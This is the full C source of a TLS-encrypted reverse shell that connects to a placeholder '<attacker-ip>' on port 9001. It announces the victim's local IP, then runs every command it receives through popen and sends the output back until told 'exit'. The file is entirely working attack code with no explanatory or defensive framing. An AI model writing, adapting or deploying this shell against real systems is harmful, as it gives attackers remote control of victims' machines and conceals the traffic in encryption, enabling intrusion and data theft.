#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

int main(){
    // Initialize OpenSSL
    SSL_library_init();
    SSL_CTX *ctx = SSL_CTX_new(SSLv23_client_method());
    if (!ctx) exit(1);

    int port = 9001;
    struct sockaddr_in serv_addr;
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    serv_addr.sin_addr.s_addr = inet_addr("<attacker-ip>");

    connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr));

    // Perform SSL handshake
    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    if (SSL_connect(ssl) != 1) exit(1);

    // Get local IP
    struct sockaddr_in local_addr;
    socklen_t addr_len = sizeof(local_addr);
    getsockname(sock, (struct sockaddr*)&local_addr, &addr_len);
    char ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &local_addr.sin_addr, ip_str, INET_ADDRSTRLEN);
    char greeting[200];
    snprintf(greeting, sizeof(greeting), "%s> ", ip_str);
    SSL_write(ssl, greeting, strlen(greeting));

    char buffer[1024];
    char prompt[50];
    prompt[0]='\0';
    strcat(prompt,ip_str);
    strcat(prompt,"> ");

    while(1) {
        int len = SSL_read(ssl, buffer, sizeof(buffer) - 1);
        if (len <= 0) break;
        buffer[len] = '\0';
        buffer[strcspn(buffer, "\n\r")] = 0;

        if (strcmp(buffer, "exit") == 0) break;

        FILE *fp = popen(buffer, "r");
        if (fp) {
            while (fgets(buffer, sizeof(buffer), fp)) {
                SSL_write(ssl, buffer, strlen(buffer));
            }
            pclose(fp);
        }
        SSL_write(ssl, prompt, strlen(prompt));
    }

    SSL_shutdown(ssl);
    SSL_free(ssl);
    SSL_CTX_free(ctx);
    close(sock);
    return 0;
}   
